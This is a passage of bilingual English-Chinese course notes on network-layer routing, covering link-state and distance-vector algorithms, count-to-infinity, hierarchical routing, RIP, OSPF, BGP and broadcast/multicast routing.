class=""><table><thead><tr><th>step</th><th>N’</th><th>D(v),p(v)</th><th>D(w),p(w)</th><th>D(x),p(x)</th><th>D(y),p(y)</th><th>D(z),p(z)</th></tr></thead><tbody><tr><td>0</td><td>u</td><td>7,u</td><td>3,u</td><td>5,u</td><td>∞</td><td>∞</td></tr><tr><td>1</td><td>uw</td><td>6,w</td><td></td><td>5,u</td><td>11,w</td><td>∞</td></tr><tr><td>2</td><td>uwx</td><td>6,w</td><td></td><td></td><td>11,w</td><td>14,x</td></tr><tr><td>3</td><td>uwxv</td><td></td><td></td><td></td><td>10,v</td><td>14,x</td></tr><tr><td>4</td><td>uwxvy</td><td></td><td></td><td></td><td></td><td>12,y</td></tr><tr><td>5</td><td>uwxvyz</td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><ul><li><p>for each dest., the  next-hop node on the  least-cost path from  u to the dest</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.5.jpg" class=""></li><li><p>在所有迭代中需要搜寻的结点总数为 n（n+1）/2</p><p>O(n^2^),more efficient implementations possible: O(nlogn)</p></li><li><p><strong>oscillations(振荡)</strong> possible:</p><ul><li><p>e.g., suppose link cost equals amount of carried traffic</p></li><li><p>solution: router randomize the time it sends out a link  advertisement (路由器发送链路通告的时间随机化)</p><ul><li>ensure that not all routers run the LS algorithm at the same time</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.6.jpg" class=""></li></ul></li></ul><h3 id="4-5-2-The-Distance-Vector-DV-Routing-Algorithm-距离向量路由选择算法">4.5.2 The Distance-Vector (DV)Routing Algorithm,距离向量路由选择算法</h3><ul><li><p>Bellman-Ford equation</p><ul><li><p><strong>Bellman-Ford equation (贝尔曼福特方程)</strong> (dynamic programming) let</p><p>d~x~ (y) := cost of least-cost path from x to y (节点x到节点y的最小代价路径值)</p><p>d~x~ (y) = min~v~ {c(x,v) + d~v~ (y) }</p><ul><li>min taken over all neighbors v of x (遍历x的所有邻居v)</li><li>c(x,v)：cost to neighbor v</li><li>d~v~ (y)：cost from neighbor v to destination y</li></ul></li><li><p>Bellman-Ford example</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.7.jpg" class=""><ul><li><p>clearly, d~v~ (z) = 5, d~x~ (z) = 3, d~w~ (z) = 3</p></li><li><p>B-F equation says:</p><p>d~u~ (z) = min { c(u,v) + d~v~ (z), c(u,x) + d~x~ (z), c(u,w) + d~w~ (z) }</p><p>​   = min {2 + 5, 1 + 3, 5 + 3} = 4</p></li><li><p>node achieving minimum is next hop in shortest path(最短路径中的下一跳的节点可知：BF方程中的节点v), can be  used in forwarding table</p></li><li><p>例如：上面的例子中，u到z的最 短路径代价值为4，是通过节点x这个节点取得最短，因此从节点u 到节点z应该选择节点x作为其下 一跳</p></li></ul></li></ul></li><li><p>Distance vector (DV)  algorithm (距离向量算法)</p><ul><li><p>d~x~ (y) := cost of least-cost path from x to y (节点x到节点y的最小代价路径值)</p></li><li><p>D~x~ (y) = <strong>estimate</strong>(估计值) of least cost from x to y (i.e.  distance vector)</p></li><li><p>node x:</p><p>(1) knows cost to each <strong>neighbor</strong> v: c(x,v)</p><p>(2) maintains distance vector D~x~ = [D~x~ (y): y є N ] (x节点自己：到所有节点的最短路径代价的估计值)</p><p>(3) maintains <strong>its neighbors’ distance vectors</strong>. For each  neighbor v, x maintains</p><p>D~v~ = [D~v~ (y): y є N ] (x节点邻居：所有邻居节点v的距离向量，即所有节点v到所有其他节点的最短路径代价的估计值)</p></li><li><p>key idea:</p><p>(1) from time-to-time, each node sends its own  distance vector estimate to <strong>neighbors</strong></p><p>(2) when x receives new DV estimate from neighbor, it  <strong>updates its own DV</strong> using <strong>B-F equation</strong>:</p><p>D~x~ (y) ← min~v~ {c(x,v) + D~v~ (y)} for each node y ∊ N</p></li><li><p>under minor, natural conditions, the estimate D~x~ (y)  converge(收敛) to the actual least cost d~x~ (y) 估计值将最终收敛接近实际值</p></li><li><p>iterative(迭代), asynchronous( 异步): each local iteration  caused by:</p><p>(1) local link cost change</p><p>(2) DV update message  from neighbor</p></li><li><p>distributed(分布式)</p><ul><li>each node notifies neighbors only when its DV changes(只有自己的DV发生变化通知邻居)<ul><li>neighbors then notify  their neighbors if  necessary</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.8.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.9.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.10.jpg" class=""></li></ul></li><li><p>Distance vector: link  cost changes</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.11.jpg" class=""><p>1、</p><ul><li>link cost changes:<ul><li>node detects local link cost change  (from itself to a neighbor) 4-&gt;1</li><li>updates routing info, recalculates  distance vector</li><li>if DV changes, notify neighbors</li><li>example(only focus y and z)</li></ul></li><li>t0  : y detects link-cost change (4 to 1), updates its DV,  informs its neighbors</li><li>t1  : z receives update from y, updates its table, computes  new least cost to x (5 to 2), sends its neighbors its DV</li><li>t2  : y receives z ’s update, updates its distance table. y ’s least  costs do not change, so y does not send a message to z</li><li><strong>“good news  travels fast”</strong></li></ul><p>2、</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.12.jpg" class=""><ul><li><p>link cost changes:</p><ul><li><p>node detects local link cost change</p></li><li><p>“bad news travels slow“ - “count to  infinity” problem!</p></li><li><p>44 iterations before algorithm  stabilizes: see textbook</p></li><li><p>Before the link cost changes(稳定), Dy (x) = 4, Dy (z) = 1, Dz (y)  = 1, and Dz (x) = 5</p></li><li><p>(1) At time t0 , y detects the link-cost change (the cost has  changed from 4 to 60). Y computes its new minimum-cost  path to x to have a cost of  Dy (x) = min{c(y,x) + Dx (x), c(y,z) + Dz (x)} = min{60 + 0, 1 + <strong>5</strong>} = 6</p><p>（注意：节点z尚未知道变化（<strong>D~z~ (x) = 5</strong>））</p></li><li><p>全局来看：this new cost <strong>from y to x  via z is wrong</strong>!!!</p></li><li><p>the only information node y has is  that its direct cost to x is 60 and  that z has last told y that z could get  to x with a cost of 5</p></li><li><p>y would now route x through z!!! (y将选 择一条从z到x的路由)</p></li><li><p><strong>routing loop</strong>(路由循环)!!!—in order to  get to x, y routes through z, and z  routes through y</p></li><li><p><strong>until the forwarding tables are  changed</strong> (路由转发表变化前将持续进行)</p></li><li><p>(2) Since node y has computed a new minimum cost to x, it  informs z of its new distance vector <strong>at time t1</strong></p></li><li><p>(3) <strong>Sometime after t1</strong>, z receives y’s  new distance vector, which indicates  that <strong>y’s minimum cost to x is 6</strong></p></li><li><p>z knows it can <strong>get to y</strong> with a cost <strong>of 1</strong>  and hence <strong>computes a new least</strong> cost  to x of</p></li><li><p>D~z~ (x) = min{c(z,x) + D~x~ (x), c(z,y) + D~y~ (x)}  =min{50 + 0, 1 + 6} = 7</p></li><li><p>Since z’s least cost to x has increased,  it then informs y of its new distance  vector <strong>at time t2</strong></p></li><li><p>(4) In a similar manner, after receiving z’s new distance  vector, y determines <strong>D~y~ (x) = 8</strong> and sends z its distance  vector. z then determines <strong>D~z~ (x) = 9</strong> and sends y its  distance vector, and so on</p></li><li><p>You should convince yourself that the  loop will persist for <strong>44 iterations</strong>  (message exchanges between y and  z)—until <strong>z</strong> eventually computes the  cost of its path via <strong>y</strong> to <strong>be greater  than 50</strong></p></li><li><p>At this point, <strong>z</strong> will (finally!) determine  that its least-cost path to <strong>x</strong> is via <strong>its  direct connection to x</strong></p></li><li><p><strong>y</strong> will then route to <strong>x</strong> via <strong>z</strong></p></li><li><p>The result of the <strong>bad news</strong> about the  increase in link cost has indeed  <strong>traveled slowly</strong>!</p></li></ul></li><li><p>poisoned reverse:</p><ul><li>If <strong>Z</strong> routes through <strong>Y</strong> to get to <strong>X</strong> :<ul><li>Z tells Y its (Z’s) distance to X is <strong>infinite</strong> (so Y  won ’t route to X via Z)</li></ul></li><li>will this completely solve <strong>count to infinity</strong> problem?<ul><li>NO, three more nodes</li></ul></li></ul></li></ul></li><li><p>Comparison of LS and  DV algorithms</p><ul><li><p>message complexity</p><ul><li>LS: with n nodes, E links, O(nE)  msgs sent (global: 与<strong>所有节点</strong>交互信息)</li><li>DV: exchange between neighbors  only (仅与<strong>邻居节点</strong>交互信息)<ul><li>convergence time varies</li></ul></li></ul></li><li><p>speed of convergence, 收敛速度</p><ul><li><p>LS: <strong>O(n^2^)</strong> algorithm requires  <strong>O(nE)</strong> msgs</p><ul><li>may have <strong>oscillations (振荡)</strong></li></ul></li><li><p>DV: convergence time varies</p><ul><li><p>may be <strong>routing loops(环路)</strong></p></li><li><p><strong>count-to-infinity</strong> problem</p></li></ul></li></ul></li><li><p>robustness，健壮性: what happens  if router malfunctions( 发生故障)?</p><ul><li>LS:<ul><li>node can <strong>advertise</strong> incorrect <strong>link</strong> cost</li><li>each node computes <strong>only</strong>  its <strong>own table</strong></li></ul></li><li>DV:<ul><li>DV node can advertise  incorrect <strong>path</strong> cost</li><li>each node’s table used by  <strong>others</strong><ul><li>error propagate (扩散)  thru network</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="4-5-3-Hierarchical-Routing，层次路由选择">4.5.3 Hierarchical Routing，层次路由选择</h3><p>our routing study thus far - idealization</p><p>1、all routers identical相同的</p><p>2、network “flat” …</p><p>3、not true in practice</p><p>==&gt;</p><p>1、Scale</p><p>with 600 million (6亿)  destinations:</p><ul><li>can ’t store all dest’s in routing  tables: broadcast LS updates  <strong>leave no bandwidth</strong> to <strong>send data</strong>，没有剩余的带宽</li><li>routing table exchange would  swamp links: DV would surely <strong>never converge</strong>，无法收敛</li></ul><p>2、administrative autonomy(管理自治)</p><ul><li>internet = network of networks</li><li>each network admin may  want to control routing in  its own network</li></ul><p>:star:Solution: aggregate  routers into regions, <strong>“autonomous systems” (AS) 自治系统</strong></p><ul><li><p>routers in same AS run  same routing protocol  (e.g. DV or LS)</p><ul><li><strong>“intra-AS” routing  protocol (自治系统域内路由协议)</strong></li><li>routers in different AS  can run different intra-AS routing protocol</li></ul></li><li><p>gateway router(网关路由器):</p><ul><li>at “edge” of its own AS</li><li>has link to router in  another AS</li></ul></li><li><p>Difference concepts :</p><p>default gateway (默认网关)</p><p>default router (默认路由器)</p><p>gateway router(网关路由器): being responsible for forwarding packets to destinations <strong>outside the AS</strong></p></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.32.jpg" class=""><ul><li><strong>inter-AS routing protocol，自治系统间路由选择协议</strong></li><li>obtaining <u>reachability information</u> from neighboring ASs，获取可达性信息</li><li>propagating the reachability information to <strong>all routers internal to the AS</strong>，向该 AS 中所有路由器传播可达性信息</li><li>the two communicating ASs must run the <strong>same</strong> inter-AS routing protocol</li><li>in the <strong>Internet</strong> all ASs run the same inter-AS routing protocol, called <strong>BGP4</strong></li></ul>  <img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.33.jpg" class=""><ul><li><p>Example 1: setting  forwarding table in router 1d</p><ul><li>suppose AS1 learns (via <strong>inter-AS protocol</strong>) that subnet x reachable via AS3 (gateway 1c), but not via AS2 (gateway 1b)<ul><li>inter-AS protocol propagates reachability info to all internal  routers (AS1内部路由器)</li></ul></li><li>router <strong>1d</strong> determines from <strong>intra-AS routing info</strong> that its  interface <strong>Ⅰ</strong> is on the least cost path to 1c<ul><li>installs forwarding table entry <strong>(x,Ⅰ)</strong></li></ul></li></ul></li><li><p>Example 2: choosing  among multiple ASes</p><ul><li><p>now suppose AS1 learns from <strong>inter-AS protocol</strong> that  subnet <strong>x</strong> is reachable from <strong>AS3</strong> and from <strong>AS2</strong></p></li><li><p>to configure forwarding table, router <strong>1d</strong> must determine  which gateway it should forward packets towards for dest <strong>x</strong></p><ul><li>this is also <strong>job of inter-AS routing protocol!</strong></li></ul></li><li><p><strong>hot potato routing(热土豆路由)</strong>: send packet towards  closest of two routers**(尽可能快摆脱数据包-热土豆)**</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.34.jpg" class=""><ul><li>选择:源路由器距离网关路由器最短路径<strong>代价中最小</strong>的网关，作为其转发表对应的接口！</li></ul></li></ul></li></ul><h1>4.6 Routing in the Internet,因特网中的路由选择</h1><ul><li>Inra-AS routing protocols are also known as <strong>interior gateway protocols(内部网关协议)</strong><ul><li><strong>Routing Information Protocol (RIP，路由选择信息协议)</strong></li><li><strong>Open Shortest Path First (OSPF，开放最短路优先)</strong></li></ul></li></ul><h3 id="4-6-1-Intra-AS-Routing-in-the-Internet-RIP">4.6.1 Intra-AS Routing in the Internet: RIP</h3><ul><li><p>widespread deployment reason: included in BSD-UNIX  distribution in 1982，UNIX伯克利软件分发版本</p></li><li><p>uses <strong>hop count(跳数)</strong> as a <u>cost metric</u>(成本度量，路由的度量值)==&gt;each <strong>link</strong> has a cost of 1</p></li><li><p>In RIP(and also in OSPF), costs are actually from source router to a destination subnet</p><p>RIP uses the term hop, which is <strong>the number of subnets</strong> traversed along the shortest path from <strong>source router</strong> to <strong>destination subnet</strong>, including the destination subnet，在RIP（也在OSPF） 中，费用实际上是从源路由器到目的子网。RIP 使用术语跳，跳是沿着从源路由器到目的 子网（包括目的子网）的最短路径所经过的子网数量</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.34-16536391639381.jpg" class=""><ul><li><code>连接路由器的线表示子网；的路由器（A、B、C、D）与 网络（w、x、y、z））被标记；。虚线指示了该AS还在继续</code></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.341.jpg" class=""><ul><li><p>In RIP, <strong>routing updates</strong> are <strong>exchanged</strong> between neighbors approximately(大约) every <strong>30 seconds</strong> using a <strong>RIP response message(RIP响应报文)</strong></p></li><li><p>each advertisement: list of up to <strong>25</strong> destination subnets (in IP addressing sense)，as well as the <strong>sender’s distance</strong> to <strong>each</strong> of those subnets</p></li><li><p><code>现在假定 30秒以后，路由器D收到来自路由器A的通告==&gt;路由器D将该通告与旧路由选择表合并</code></p></li></ul><table><thead><tr><th>destination subnet</th><th>next router</th><th># hops to dest</th><th></th><th>destination subnet</th><th>next router</th><th># hops to dest</th></tr></thead><tbody><tr><td>z</td><td>C</td><td>4</td><td>←<br />A的通告</td><td>w</td><td>A</td><td>2</td></tr><tr><td>w</td><td>—</td><td>1</td><td></td><td>y</td><td>B</td><td>2</td></tr><tr><td>x</td><td>—</td><td>1</td><td>→<br />D的转发表改变</td><td>z</td><td>A</td><td>5</td></tr><tr><td>…</td><td>…</td><td>…</td><td></td><td>…</td><td>…</td><td>…</td></tr></tbody></table><ul><li><p>if no advertisement heard after <strong>180 sec</strong> → neighbor/link declared <strong>dead</strong></p><ul><li>routes A via neighbor invalidated (无效)</li><li>new advertisements sent to A’s other <strong>neighbors</strong></li><li>other neighbors in turn send out new advertisements (if tables changed)</li></ul></li><li><p>link failure info quickly (?) propagates to entire net</p><ul><li><strong>poison reverse（毒性逆转）</strong> used to prevent ping-pong loops ( 无限距离<strong>infinite distance = 16 hops</strong>)</li></ul></li><li><p><strong>advertisements</strong> sent in <strong>UDP packets</strong>, using port number  <strong>520</strong>, periodically repeated</p></li><li><p>RIP routing tables managed by <strong>application-level</strong> process  called <strong>route-d (daemon，守护进程)</strong></p><p>RIP uses a <strong>transport-layer protocol (UDP)</strong> on top of a <strong>network-layer protocol (IP)</strong> to implement <strong>network-layer functionality(a routing algorithm)</strong>，RIP使用一个位于网络层协议（IP）之上的运输层协议（UDP）来实现网络层功能（一种路由选择算法）</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.39.jpg" class=""></li></ul><h3 id="4-6-2-Intra-AS-Routing-in-the-Internet-OSPF">4.6.2 Intra-AS Routing in the Internet: OSPF</h3><ul><li><p>OSPF is deployed in <strong>upper-tier</strong> ISPs whereas RIP is  deployed in <strong>lower-tier ISPs</strong> and <strong>enterprise networks</strong></p></li><li><p>The Open in OSPF indicates that the routing protocol specification is <strong>publicly available</strong>(for example,as opposed to <u>Cisco’s EIGRP protocol</u>)</p></li><li><p>At its <strong>heart</strong>, however, OSPF is a <strong>link-state protocol</strong> that uses <strong>flooding of link-state information(洪泛链路状态信息)</strong> and a <strong>Dijkstra least-cost path algorithm(Dijkstra最低费用路径算法)</strong></p><ul><li><p>LS packet dissemination (自治系统内容<strong>所有</strong>路由器广播)</p></li><li><p>topology map at <strong>each</strong> node</p></li><li><p>route computation using <strong>Dijkstra’s</strong> algorithm</p></li></ul></li><li><p>With OSPF, a router constructs a complete <strong>topological map</strong> (that is,a graph) of the e<strong>ntire autonomous system</strong>，构建自治系统完整的拓扑图</p></li><li><p>Individual link costs are configured by the <u>network administrator</u></p></li><li><p>broadcasts a link’s state <strong>periodically</strong> (<u>at least</u> once every <strong>30 minutes</strong>), <strong>even if</strong> the link’s state has <strong>not change</strong></p><ul><li>adds robustness to the link state algorithm，增加健壮性</li></ul></li><li><p>OSPF advertisements are contained in <strong>OSPF messages</strong> that are <strong>carried directly by IP</strong>, with an <strong>upper-layer protocol</strong> of <strong>89</strong> for OSPF，对 OSPF 其上层协议的值为89</p></li><li><p>OSPF protocol must <u>itself implement</u> functionality such as <strong>reliable message transfer</strong> and <strong>link-state broadcast</strong></p></li><li><p>checks that links are <strong>operational</strong>，(检查链路正在运行) (via a HELLO message that is sent to an attached neighbor) and allows an OSPF router to obtain a neighboring router’s database of network-wide link state</p></li><li><p>OSPF advertisement carries one entry per neighbor</p></li><li><p>advertisements flooded to entire AS</p><ul><li>carried in OSPF messages directly over IP (注：RIP由UDP报文承载)</li></ul></li><li><p>OSPF “advanced”  features (not in RIP)</p><ul><li>(1)<strong>security</strong>: all OSPF messages authenticated (to  prevent malicious intrusion)</li><li>(2) <strong>multiple</strong> same-cost <strong>paths</strong> allowed (only <strong>one path</strong> in  <strong>RIP</strong>)<ul><li>for each link, multiple cost metrics for different TOS (e.g., satellite link cost set “low” for best effort TOS;  “high” for real time TOS)</li></ul></li><li>(3) integrated(综合) <strong>unicas</strong>t(单播) and multicast support:<ul><li>Multicast OSPF (MOSPF) uses same topology data base as  OSPF</li></ul></li><li>(4) <strong>hierarchical(分层)</strong> OSPF in large domains</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.40.jpg" class=""><ul><li><p>Hierarchical OSPF</p><ul><li><p>two-level hierarchy: local area, backbone(骨干)</p><ul><li><p>link-state advertisements only in area</p></li><li><p>each nodes has detailed area topology (仅在区域内);</p><p><strong>only know direction (shortest path)</strong> to nets in other  areas</p></li></ul></li><li><p><strong>area border routers</strong>: “summarize” distances to nets  in own area, advertise to other Area Border routers</p></li><li><p><strong>backbone routers</strong>: run OSPF routing limited to  backbone</p></li><li><p><strong>boundary routers</strong>: connect to other AS’s</p></li></ul></li></ul><h3 id="4-6-3-Inter-AS-Routing-BGP">4.6.3 Inter-AS Routing: BGP</h3><ul><li><p><strong>BGP (Border Gateway Protocol, 边界网关协议)</strong>: the de  facto <strong>inter-domain routing protocol (域间路由协议)</strong> in today’s Internet</p><ul><li>“glue(胶水) that holds the Internet together”</li></ul></li><li><p>BGP provides each AS a means to:</p><ol><li><strong>eBGP</strong>: obtain subnet reachability information from <u>neighboring ASs</u></li><li><strong>iBGP</strong>: propagate reachability information to all <u>AS-internal routers</u> (AS内部路由器)</li><li>determine “good” routes to other networks based  on reachability information and policy</li></ol></li><li><p>allows subnet to advertise its existence to rest of  Internet: “I am here”</p></li></ul><h6 id="BGP-Basics">BGP Basics</h6><ul><li><strong>BGP session</strong>: two BGP routers (“peers”) exchange BGP messages:<ul><li>advertising <strong>paths</strong> to different destination network prefixes  (“path vector” protocol)</li><li>exchanged over <strong>semi-permanent(半永久) TCP connections</strong> using  port <strong>179</strong></li></ul></li><li>when AS3 advertises a prefix to AS1:<ul><li>AS3 <strong>aggregate</strong> prefixes in its advertisement <strong>(路由聚合</strong>)</li><li>AS3 <strong>promises</strong> it will forward datagrams towards that prefix</li></ul></li></ul><h6 id="BGP-basics-distributing-path-information">BGP basics: distributing  path information</h6><ul><li><p>using <strong>external BGP(eBGP) session</strong> between 3a and 1c,  AS3 sends prefix reachability info to AS1</p><ul><li>1c can then use <strong>internal BGP(iBGP)</strong> do distribute new  prefix info to all routers in AS1</li><li>1b can then re-advertise new reachability info to AS2  over 1b-to-2a <strong>eBGP session</strong></li></ul></li><li><p>when router learns of new prefix, it creates entry for  prefix in its forwarding table</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.41.jpg" class=""></li><li><p>In BGP, destination are not host instead are <strong>CIDRized prefixes</strong></p></li><li><p>example 1</p><ul><li>suppose there are four subnets attached to AS2: 138.16.64/24,  138.16.65/24, 138.16.66/24, and 138.16.67/24</li><li>Then, AS2 could aggregate prefixes for the four subnets and use BGP to  advertise single prefix to <u>138.16.64/22</u> to <u>AS1</u></li></ul></li><li><p>example 2</p><ul><li>only the first three of those four subnets are in AS2 and the fourth  subnet, 138.16.67/24, is in AS3</li><li>routers use longest-prefix matching, AS3 advertise to AS1 the <u>more specific prefix 138.16.67/24</u> and AS2 still advertise to AS1 the  aggregated prefix <u>138.16.64/22</u></li></ul></li><li><p>Path attributes and BGP routes</p><ul><li><p>advertised prefix includes BGP attributes</p></li><li><p>prefix + attributes = “route” (带有属性的前缀即一条路由)</p></li><li><p>two important attributes:</p><ul><li><p><strong>AS-PATH</strong>: contains ASs through which prefix advertisement  has passed: e.g., AS2, AS1 (假定前缀138.16.64/24 首先是由AS2向ASl通告的;如果ASl接下来将该前缀向AS3通告，则该AS-PATH 将是AS2 ASl)</p><p>used to <strong>detect and prevent looping</strong> (检测和防止循环通告)</p></li><li><p><strong>NEXT-HOP</strong>: indicates specific internal-AS router interface  to next-hop AS. (may be multiple links from current AS to next-hop-AS) 用于正确配置转发表</p></li></ul></li><li><p>gateway router receiving route advertisement uses <strong>import  policy</strong> (输入策略) to accept/decline, e.g., never route through  AS x</p><ul><li><strong>policy-based</strong> routing</li></ul></li></ul></li></ul><h6 id="BGP-Route-Selection">BGP Route Selection</h6><ul><li>router may learn about more than 1 route to  destination AS, selects route based on (如果对相同前缀存在2条及以上路由，BGP顺序调用下列消除规则):</li></ul><ol><li>local preference value attribute: <strong>policy  decision (set by manager)</strong></li><li>shortest <strong>AS-PATH</strong> (DV algorithm will be  enabled if only this rule)</li><li>closest <strong>NEXT-HOP</strong> router: <strong>hot potato routing (热土豆路由)</strong></li><li>additional BGP criteria (标准)</li></ol><h6 id="BGP-messages">BGP messages</h6><ul><li>BGP messages exchanged between peers over <strong>TCP connection</strong> (注意!)</li><li>BGP messages:<ul><li><strong>OPEN</strong>: opens TCP connection to peer and authenticates  sender</li><li><strong>UPDATE</strong>: advertises new path (or withdraws old)</li><li><strong>KEEPALIVE</strong>: keeps connection alive in absence of UPDATES;  also ACKs OPEN request</li><li><strong>NOTIFICATION</strong>: reports <strong>errors</strong> in previous msg; also used  to <strong>close</strong> connection</li></ul></li></ul><h6 id="BGP-routing-policy">BGP routing policy</h6><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.35.jpg" class=""><ul><li>A,B,C are <strong>provider networks</strong></li><li>X,W,Y are <strong>customer</strong> (of <strong>provider networks</strong>)</li><li>X is <strong>dual-homed (双宿)</strong>: attached to two networks<ul><li>X <strong>does not</strong> want to route from <strong>B</strong> via <strong>X</strong> to <strong>C</strong></li><li>… so X will not advertise to B <strong>a route</strong> to C (advertise it <strong>has no  paths</strong> to other dest. except itself)</li></ul></li><li>A advertises path AW to B (B knows A has a path AW to W.)</li><li>B advertises path BAW to X (X knows that it can route to W  via B)</li><li>Should B advertise path BAW to C?<ul><li><strong>No way</strong>! B gets <strong>no “revenue” 没有收益</strong> for routing CBAW since  neither A <strong>nor</strong> C are B’s <strong>customers</strong></li><li>B wants to <strong>force C to route to w via A</strong></li><li>B wants to route <strong>only</strong> to/from its customers!</li><li>need peering agreements</li></ul></li></ul><h1>4.7 Broadcast and Multicast Routing，播和多播路由选择</h1><ul><li>In <strong>broadcast routing(广播)</strong>, the network layer provides a service of delivering a packet sent from a source node to <strong>all other nodes</strong> in the network</li><li><strong>multicast(多播)</strong> routing enables a single source node to <strong>send a copy of a packet</strong> to a <strong>subset of the other network nodes</strong>，子集</li></ul><h3 id="4-7-1-Broadcast-Routing-Algorithms">4.7.1 Broadcast Routing Algorithms</h3><ul><li><p><strong>N-way-unicast(N次单播)</strong></p><ul><li><p>the source node simply makes <strong>N copies</strong> of the packet, <strong>addresses(编址)</strong> each copy to a <u>different destination</u>, and then transmits the N copies to the N destinations using <strong>unicast routing</strong></p></li><li><p>优</p><ul><li>simple—no <strong>new</strong> network-layer routing protocol, <strong>packet-duplication</strong>(复制), or <strong>forwarding functionality</strong> is needed</li></ul></li><li><p>缺</p><ul><li><p>inefficiency</p><ul><li>若需都需通过一条路径，则N个副本都会经过该处</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.44.jpg" class=""></li></ul></li></ul></li></ul><p>In-network duplication</p><p>1、<strong>Uncontrolled Flooding(无控制洪泛)</strong></p><ul><li>the source node sends a copy of the packet to all of its <strong>neighbors</strong></li><li>When a node receives a broadcast packet, it duplicates the packet and forwards it to all of its <strong>neighbors</strong> (<strong>except</strong> the neighbor from which it received the packet)<ul><li>If the graph has cycles==&gt;cycle indefinitely</li><li><strong>broadcast storm(广播风暴)</strong>:（当一个结点与两个以上其他结点连接）resulting from the endless multiplication of broadcast packets，无休止地复制</li></ul></li></ul><p>2、<strong>Controlled Flooding(受控洪泛)</strong></p><ul><li>node only broadcasts pkt if it hasn’t  broadcast same packet before<ul><li>node keeps track of packet ids already broadcasted<ul><li><strong>sequence-number-controlled flooding(序号控制洪泛)</strong></li><li><strong>broadcast sequence number(广播序号)</strong></li></ul></li><li><strong>reverse path forwarding (RPF，反向路径转发)</strong>: only forward packet if it arrived  on shortest path between node and source（反向路径广播（RPB））<ul><li>当一台路由器接 收到具有给定源地址的广播分组时，仅当该分组到达的链路正好是位于它自己的返回其源的最短单播路径上，它才向其所有出链路（除了它接收分组的那个）传输报文;否则，路由器只是丢弃入分组而不向任何它的出链路转发分组</li></ul></li></ul></li></ul><p>3、<strong>panning-Tree Broadcast(生成树广播)</strong></p><p>序号控制洪泛和 RPF避免了广播风暴，但它们不能完全避免冗余广播分组的传输</p><ul><li><p>no redundant packets received by any node</p></li><li><p>first construct a spanning tree</p></li><li><p>nodes then forward/make copies only along spanning  tree</p></li><li><p>Spanning tree: creation</p><ul><li>center node</li><li>each node sends unicast join message to center node<ul><li>message forwarded until it arrives at a node already belonging  to spanning tree</li></ul></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.45.jpg" class=""><h3 id="4-7-2-Multicast-多播">4.7.2 Multicast, 多播</h3><ul><li><p>problem statement</p><ul><li>goal: find a tree (or trees) connecting routers  having local mcast group members</li><li>tree: not all paths between routers used</li><li>shared-tree: same tree used by all group  members</li><li>source-based: different tree from each sender  to rcvrs</li></ul></li><li><p>Approaches for building  mcast trees</p><ul><li>approaches:<ul><li>source-based tree: one tree per source<ul><li>shortest path trees<ul><li>Dijkstra’s algorithm</li></ul></li><li>reverse path forwarding</li></ul></li><li>group-shared tree: group uses one tree<ul><li>minimal spanning (Steiner)</li><li>center-based trees</li></ul></li></ul></li></ul></li><li><p>Reverse path forwarding</p><ul><li><p>rely on router’s knowledge of unicast  shortest path from it to sender</p></li><li><p>each router has simple forwarding behavior:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">if</span> (mcast datagram received <span class="hljs-keyword">on</span> incoming link <span class="hljs-keyword">on</span> shortest path <span class="hljs-keyword">back</span> <span class="hljs-keyword">to</span> center)<br><span class="hljs-keyword">then</span> flood datagram <span class="hljs-keyword">onto</span> all outgoing links<br><span class="hljs-keyword">else</span> ignore datagram<br></code></pre></td></tr></table></figure></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.46.jpg" class=""><ul><li>result is a source-specific reverse SPT<ul><li>may be a bad choice with asymmetric links</li></ul></li><li>forwarding tree contains subtrees with no mcast group members<ul><li>no need to forward datagrams down subtree</li><li>“prune” msgs sent upstream by router with no downstream group  members</li></ul></li></ul></li><li><p>Shared-tree: steiner tree</p><ul><li>steiner tree: 